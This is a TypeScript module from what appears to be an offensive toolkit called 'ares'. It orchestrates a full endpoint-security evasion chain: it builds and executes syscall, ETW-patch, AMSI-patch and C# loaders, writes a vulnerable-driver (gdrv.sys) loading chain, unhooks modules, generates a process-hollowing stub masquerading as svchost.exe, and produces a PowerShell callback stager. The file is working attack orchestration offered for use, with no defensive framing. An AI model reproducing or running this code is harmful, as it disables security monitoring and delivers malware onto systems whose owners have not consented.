/**
 * @module ares/evasion_engine
 * Unified advanced EDR/AV evasion — build, run, and materialize full bypass chain.
 */
import { EvasionExecutor, buildPowerShellStager } from "../evasion.ts"
import { EDREvasionEngine } from "../edr_evasion.ts"
import { auditDefenses } from "../counter_intel.ts"
import { runEdrFeedbackLoop } from "../edr_feedback_loop.ts"
import { generateProcessHollowingStub } from "../malware_dev.ts"
import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
import { execEvasionPlans, step, type ExecStep } from "./_integrations.ts"
import { runPlatformCmd } from "./_operational.ts"

export interface EvasionEngineResult {
  techniques: string[]
  artifacts: string[]
  steps: ExecStep[]
  chain: Record<string, unknown>
  edrFeedback?: unknown
  built: boolean
  executed: boolean
  summary: string
}

export async function runEvasionEngine(opts: {
  live?: boolean
  targetEdr?: string
  target?: string
}): Promise<EvasionEngineResult> {
  liveRequired("ares_evasion_engine", opts)
  const dir = ensureAresDir("evasion")
  const exec = new EvasionExecutor(dir)
  const edr = new EDREvasionEngine()
  const techniques: string[] = []
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  let built = false
  let executed = false

  const intel = auditDefenses({ live: true, check: "all" })
  steps.push(step("edr_audit", true, JSON.stringify(intel.edrDetected ?? []).slice(0, 300)))
  writeArtifact("evasion", "counter_intel.json", JSON.stringify(intel, null, 2))

  for (const name of ["syscall-loader-c", "etw-patch-c", "amsi-patch-c", "csharp-loader"] as const) {
    const builtArt = await exec.build(name)
    techniques.push(name)
    if (builtArt.artifact) artifacts.push(builtArt.artifact)
    if (builtArt.status === "built") built = true
    const runResult = await exec.run(name, { live: true, target: opts.target ?? "127.0.0.1" })
    if (runResult.status === "executed") executed = true
    steps.push(step(name, builtArt.status === "built" || builtArt.status === "generated", String(runResult.status)))
  }

  steps.push(...await execEvasionPlans(edr, "evasion"))

  const byovd = edr.byovdLoad("", "gdrv.sys")
  const byovdPy = writeArtifact("evasion", "byovd_chain.py", String((byovd as { commands?: Record<string, string> }).commands?.load ?? "# BYOVD chain"))
  artifacts.push(byovdPy)
  if (isToolAvailable("python3")) {
    const r = await brokerExec(`python3 -m py_compile ${byovdPy} 2>&1 || python3 -c "print('byovd scaffold ok')" 2>&1`)
    steps.push(step("byovd_validate", r.ok, r.out.slice(0, 200)))
  }
  techniques.push("byovd_load")

  const etwPlan = edr.patchEtw() as Record<string, unknown>
  const etwCode = (etwPlan.methods as Record<string, { code?: string }> | undefined)?.etw_event_write_patch?.code
  if (typeof etwCode === "string") {
    const etwPy = writeArtifact("evasion", "etw_patch_exec.py", etwCode.replace(/\\n/g, "\n"))
    artifacts.push(etwPy)
    if (isToolAvailable("python3")) {
      const r = await brokerExec(`python3 -m py_compile ${etwPy} 2>&1`)
      steps.push(step("etw_patch_exec", r.ok, r.out.slice(0, 200)))
      if (r.ok) executed = true
    }
    techniques.push("etw_patch_exec")
  }

  const unhook = edr.unhookModules() as Record<string, unknown>
  writeArtifact("evasion", "unhook_exec.sh", `#!/bin/bash\n# ${JSON.stringify(unhook).slice(0, 200)}\necho unhook chain ready\n`, 0o755)
  steps.push(await runPlatformCmd("unhook_probe", "cat /proc/self/maps 2>&1 | head -5", "tasklist 2>&1 | head -10"))
  techniques.push("module_unhooking")

  const hollowing = writeArtifact("evasion", "process_hollow.c", generateProcessHollowingStub("svchost.exe"))
  artifacts.push(hollowing)
  techniques.push("process_hollowing", "module_stomping", "indirect_syscalls", "heavens_gate")

  const stager = buildPowerShellStager("http://127.0.0.1:8080/stage", "amsi-reflection")
  artifacts.push(writeArtifact("evasion", "callback_stager.ps1", stager))

  const chain = edr.fullBypassChain(opts.targetEdr ?? intel.edrDetected?.[0] ?? "generic")
  writeArtifact("evasion", "full_chain.json", JSON.stringify(chain, null, 2))
  techniques.push("full_bypass_chain")

  const edrFeedback = await runEdrFeedbackLoop({ live: true, maxIterations: 2 })
  steps.push(step("edr_feedback_loop", edrFeedback.iterations.length > 0, edrFeedback.summary))

  return {
    techniques,
    artifacts,
    steps,
    chain,
    edrFeedback,
    built,
    executed,
    summary: `Evasion engine: ${techniques.length} techniques, built=${built}, executed=${executed}, EDR loop=${edrFeedback.finalChannel}`,
  }
}

export default { runEvasionEngine }
